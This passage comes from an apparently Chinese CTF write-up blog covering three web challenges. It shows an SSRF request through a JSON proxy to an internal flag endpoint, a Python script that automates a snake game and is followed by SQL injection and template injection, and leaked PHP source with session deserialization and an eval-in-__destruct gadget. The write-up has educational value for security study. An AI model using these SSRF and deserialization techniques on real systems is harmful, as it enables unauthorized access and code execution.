&#125;</span><br></pre></td></tr></table></figure>
<p>​		读取 flag 文件， 然后返回输出。</p>
<p>​		 <code>/v2/api/proxy</code>  存在 ssrf。直接访问 flag 无法访问，因此需要 ssrf。</p>
<p>​		正好，给了配置文件：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server <span class="punctuation">&#123;</span></span><br><span class="line">    listen <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line">    location ~ /v1 <span class="punctuation">&#123;</span></span><br><span class="line">        return <span class="number">403</span>;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    location ~ /v2 <span class="punctuation">&#123;</span></span><br><span class="line">        proxy_pass http<span class="punctuation">:</span><span class="comment">//localhost:8769;</span></span><br><span class="line">        proxy_http_version <span class="number">1.1</span>;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection $connection_upgrade;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>​		根据 <code>proxy_set_header X-Real-IP $remote_addr;</code> , 可以确定能打 ssrf。</p>
<p>​		/v2/api/proxy 是以 json 形式发包的，可以搞：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/v2/api/proxy</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.107.225.62:30903</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>142</span><br><span class="line"></span><br><span class="line"><span class="language-css">&#123;&quot;url&quot;:<span class="string">&quot;http://127.0.0.1:8769/v1/api/flag&quot;</span>,<span class="string">&quot;method&quot;</span>:<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;headers&quot;</span>:&#123;&quot;<span class="attribute">Content</span>-Type&quot;:<span class="string">&quot;application/json&quot;</span>&#125;,&quot;<span class="selector-tag">body</span>&quot;:<span class="string">&quot;&quot;</span>,<span class="string">&quot;follow_redirects&quot;</span>:false</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br></pre></td></tr></table></figure>
<p>​		响应：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.27.0</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 03 Nov 2024 07:11:08 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>67</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="string">&quot;ZmxhZ3tkM2MxNzZjZC05ZjhiLTRlOWQtOWM3Yi1mYzgyZTUxYzUwOTd9&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
<h2 id="snake"><a class="markdownIt-Anchor" href="#snake">#</a> snake：</h2>
<p>​		打游戏，写个脚本去跑，先审 js，发现了一些信息，比如 move 路由什么的，直接拿去写脚本，网上找了一圈，找到一些算法， 都改一改拿去试，最后这个能跑：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始方向</span></span><br><span class="line">current_direction = <span class="string">&#x27;RIGHT&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze4zqdxex49cesyexgc.cloudeci1.ichunqiu.com:5000/move&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送方向请求并获取游戏状态</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_direction_and_get_state</span>(<span class="params">direction</span>):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;session=eyJ1c2VybmFtZSI6ImcwMWRlbiJ9.ZycoKQ.BlD0y752_1q7iLu3ZVk5tsO6fKo&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = json.dumps(&#123;<span class="string">&quot;direction&quot;</span>: direction&#125;)</span><br><span class="line">    response = requests.post(url, headers=headers, data=data)</span><br><span class="line">    <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">f&quot;Failed to send direction: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response:&quot;</span>, response.json())</span><br><span class="line">    <span class="keyword">return</span> response.json()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算曼哈顿距离</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heuristic</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(a[<span class="number">0</span>] - b[<span class="number">0</span>]) + <span class="built_in">abs</span>(a[<span class="number">1</span>] - b[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># A* 寻路算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a_star_search</span>(<span class="params">start, goal, snake</span>):</span><br><span class="line">    open_set = []</span><br><span class="line">    heapq.heappush(open_set, (<span class="number">0</span>, start))</span><br><span class="line">    came_from = &#123;&#125;</span><br><span class="line">    g_score = &#123;<span class="built_in">tuple</span>(start): <span class="number">0</span>&#125;</span><br><span class="line">    f_score = &#123;<span class="built_in">tuple</span>(start): heuristic(start, goal)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> open_set:</span><br><span class="line">        _, current = heapq.heappop(open_set)</span><br><span class="line">        current = <span class="built_in">tuple</span>(current)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current == <span class="built_in">tuple</span>(goal):</span><br><span class="line">            path = []</span><br><span class="line">            <span class="keyword">while</span> current <span class="keyword">in</span> came_from:</span><br><span class="line">                path.append(current)</span><br><span class="line">                current = came_from[current]</span><br><span class="line">            path.reverse()</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line">        neighbors = [</span><br><span class="line">            (current[<span class="number">0</span>] + <span class="number">1</span>, current[<span class="number">1</span>]),  <span class="comment"># RIGHT</span></span><br><span class="line">            (current[<span class="number">0</span>] - <span class="number">1</span>, current[<span class="number">1</span>]),  <span class="comment"># LEFT</span></span><br><span class="line">            (current[<span class="number">0</span>], current[<span class="number">1</span>] + <span class="number">1</span>),  <span class="comment"># DOWN</span></span><br><span class="line">            (current[<span class="number">0</span>], current[<span class="number">1</span>] - <span class="number">1</span>)   <span class="comment"># UP</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> neighbor <span class="keyword">in</span> neighbors:</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= neighbor[<span class="number">0</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= neighbor[<span class="number">1</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> <span class="built_in">list</span>(neighbor) <span class="keyword">not</span> <span class="keyword">in</span> snake:</span><br><span class="line">                tentative_g_score = g_score[<span class="built_in">tuple</span>(current)] + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">tuple</span>(neighbor) <span class="keyword">not</span> <span class="keyword">in</span> g_score <span class="keyword">or</span> tentative_g_score &lt; g_score[<span class="built_in">tuple</span>(neighbor)]:</span><br><span class="line">                    came_from[<span class="built_in">tuple</span>(neighbor)] = current</span><br><span class="line">                    g_score[<span class="built_in">tuple</span>(neighbor)] = tentative_g_score</span><br><span class="line">                    f_score[<span class="built_in">tuple</span>(neighbor)] = tentative_g_score + heuristic(neighbor, goal)</span><br><span class="line">                    heapq.heappush(open_set, (f_score[<span class="built_in">tuple</span>(neighbor)], neighbor))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算下一步的方向</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_next_direction</span>(<span class="params">snake, food, current_direction</span>):</span><br><span class="line">    head = snake[<span class="number">0</span>]</span><br><span class="line">    path = a_star_search(head, food, snake)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> path:</span><br><span class="line">        next_head = path[<span class="number">0</span>]</span><br><span class="line">        x_diff = next_head[<span class="number">0</span>] - head[<span class="number">0</span>]</span><br><span class="line">        y_diff = next_head[<span class="number">1</span>] - head[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> x_diff == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;RIGHT&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> x_diff == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;LEFT&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> y_diff == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;DOWN&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> y_diff == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;UP&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果找不到路径，随机选择一个安全的方向</span></span><br><span class="line">    possible_directions = [<span class="string">&#x27;UP&#x27;</span>, <span class="string">&#x27;DOWN&#x27;</span>, <span class="string">&#x27;LEFT&#x27;</span>, <span class="string">&#x27;RIGHT&#x27;</span>]</span><br><span class="line">    opposite_directions = &#123;<span class="string">&#x27;UP&#x27;</span>: <span class="string">&#x27;DOWN&#x27;</span>, <span class="string">&#x27;DOWN&#x27;</span>: <span class="string">&#x27;UP&#x27;</span>, <span class="string">&#x27;LEFT&#x27;</span>: <span class="string">&#x27;RIGHT&#x27;</span>, <span class="string">&#x27;RIGHT&#x27;</span>: <span class="string">&#x27;LEFT&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> direction <span class="keyword">in</span> possible_directions:</span><br><span class="line">        <span class="keyword">if</span> direction == opposite_directions[current_direction]:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># 不选择相反方向</span></span><br><span class="line"></span><br><span class="line">        next_head = &#123;</span><br><span class="line">            <span class="string">&#x27;UP&#x27;</span>: [head[<span class="number">0</span>], head[<span class="number">1</span>] - <span class="number">1</span>],</span><br><span class="line">            <span class="string">&#x27;DOWN&#x27;</span>: [head[<span class="number">0</span>], head[<span class="number">1</span>] + <span class="number">1</span>],</span><br><span class="line">            <span class="string">&#x27;LEFT&#x27;</span>: [head[<span class="number">0</span>] - <span class="number">1</span>, head[<span class="number">1</span>]],</span><br><span class="line">            <span class="string">&#x27;RIGHT&#x27;</span>: [head[<span class="number">0</span>] + <span class="number">1</span>, head[<span class="number">1</span>]]</span><br><span class="line">        &#125;[direction]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= next_head[<span class="number">0</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= next_head[<span class="number">1</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> next_head <span class="keyword">not</span> <span class="keyword">in</span> snake:</span><br><span class="line">            <span class="keyword">return</span> direction</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果所有方向都会导致碰撞，返回当前方向</span></span><br><span class="line">    <span class="keyword">return</span> current_direction</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主循环</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_loop</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 初始化游戏状态</span></span><br><span class="line">        game_state = send_direction_and_get_state(<span class="string">&#x27;RIGHT&#x27;</span>)</span><br><span class="line">        snake = game_state[<span class="string">&#x27;snake&#x27;</span>]</span><br><span class="line">        food = game_state[<span class="string">&#x27;food&#x27;</span>]</span><br><span class="line">        score = game_state[<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">        current_direction = <span class="string">&#x27;RIGHT&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 计算下一步的方向</span></span><br><span class="line">            next_direction = calculate_next_direction(snake, food, current_direction)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发送方向请求并获取新的游戏状态</span></span><br><span class="line">            game_state = send_direction_and_get_state(next_direction)</span><br><span class="line">            snake = game_state[<span class="string">&#x27;snake&#x27;</span>]</span><br><span class="line">            food = game_state[<span class="string">&#x27;food&#x27;</span>]</span><br><span class="line">            new_score = game_state[<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">            status = game_state[<span class="string">&#x27;status&#x27;</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 更新方向</span></span><br><span class="line">            current_direction = next_direction</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 打印当前状态</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Current direction: <span class="subst">&#123;next_direction&#125;</span>, Snake: <span class="subst">&#123;snake&#125;</span>, Food: <span class="subst">&#123;food&#125;</span>, Score: <span class="subst">&#123;new_score&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> status != <span class="string">&#x27;ok&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Game over with status: <span class="subst">&#123;status&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序已退出&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main_loop()</span><br></pre></td></tr></table></figure>
<p>​		最后得到了这个：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response<span class="punctuation">:</span> <span class="punctuation">&#123;</span>&#x27;status&#x27;<span class="punctuation">:</span> &#x27;win&#x27;<span class="punctuation">,</span> &#x27;url&#x27;<span class="punctuation">:</span> &#x27;/snake_win?username=g01den&#x27;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>​		之后访问这个路由，感觉怪怪的，没有 flag，发现 username 的参数直接被打印了，测一测 ssti，失败了，完蛋。或者说，试试看 sql 注入，能成功，最后找到了列数：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/5084599173804427bdc3b1a2353bcb7a.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		能出，不过，我不理解为啥这里也能出 ssti？请看 VCR：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/32ea45b9656242ed8fde7ea072d05877.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		这个源码层面咋实现的？有点刁钻了，算了，直接嗦（这里被当作 html 执行了，所以看不到）：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/6f915faccad24280a7fc245b46464a92.png#pic_center" alt="在这里插入图片描述"></p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/80af9bc9b43b4694941b70507ec7d561.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		得到 flag。</p>
<h2 id="platform复现"><a class="markdownIt-Anchor" href="#platform复现">#</a> platform（复现）：</h2>
<p>​		www.zip 泄露，index：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sessionManager</span> = <span class="keyword">new</span> <span class="title class_">SessionManager</span>();</span><br><span class="line"><span class="variable">$SessionRandom</span> = <span class="keyword">new</span> <span class="title class_">SessionRandom</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;session_key&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;session_key&#x27;</span>] =<span class="variable">$SessionRandom</span> -&gt; <span class="title function_ invoke__">generateRandomString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="variable">$password</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$sessionManager</span>-&gt;<span class="title function_ invoke__">filterSensitiveFunctions</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: dashboard.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;login.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​		存在 <code>session_start();</code> ，估摸着有 session 反序列化，先记录下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionRandom</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$charactersLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>);</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="variable">$charactersLength</span> - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		 <code>['session_key']</code>  长度是 1 到 50 随机的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterSensitiveFunctions</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$sessionFile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getSessionFilePath</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sessionFile</span>)) &#123;</span><br><span class="line">            <span class="variable">$sessionData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$sessionFile</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;sensitiveFunctions <span class="keyword">as</span> <span class="variable">$function</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$sessionData</span>, <span class="variable">$function</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$sessionData</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$function</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$sessionData</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sessionFile</span>, <span class="variable">$sessionData</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Sensitive functions have been filtered from the session file.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Session file not found.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>​		这里也有点儿重要，有读取 -&gt; 替换 -&gt; 写入，并且是操作 session 的文件，感觉是字符逃逸，变少的那种。</p>
<p>​		这里存在 eval 函数，需要直接对其进行反序列化，然后触发 <code>__destruct</code> .</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">notouchitsclass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		现在就是看看触发反序列化的方法。大佬们说，可以通过追加写入，大佬用的是 password 数组去逃逸的，这里具体原理不是很懂，反正有附件，先记录下，之后捣鼓:</p>
